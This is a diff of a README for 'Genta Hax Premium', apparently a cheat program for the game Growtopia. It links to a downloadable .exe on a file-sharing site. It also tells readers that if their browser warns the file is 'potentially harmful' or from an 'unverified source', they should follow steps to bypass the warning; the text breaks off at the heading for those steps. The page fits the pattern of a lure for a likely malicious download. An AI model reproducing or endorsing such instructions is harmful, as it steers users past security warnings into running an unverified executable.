@@ -8,15 +8,15 @@ Genta Hax Premium for the latest and older versions of Growtopia.
 
 ## Features
 - **Feature 1**: Description of feature 1.
-  ![Feature 1](genta1.jpeg)
+  ![Feature 1](images/genta1.jpeg)
 
 - **Feature 2**: Description of feature 2.
-  ![Feature 2](genta2.jpeg)
+  ![Feature 2](images/genta2.jpeg)
 
 ## Installation
 
 1. **Download the Application**:
-   - Click the link below to download the demo application: [Download Genta Hax Premium](https://www.mediafire.com/file/zw4a7axfo32n2eg/Genta_Hax_Premium_%252864_Bit%2529.exe/file).
+   - Click the link below to download the application: [Download Genta Hax Premium](https://www.mediafire.com/file/zw4a7axfo32n2eg/Genta_Hax_Premium_%252864_Bit%2529.exe/file).
    - **Note**: If your browser shows a warning like **"Download blocked due to unverified source"** or **"This file is potentially harmful"**, follow these steps to bypass the issue.
 
 2. **Bypassing Browser Warnings**:
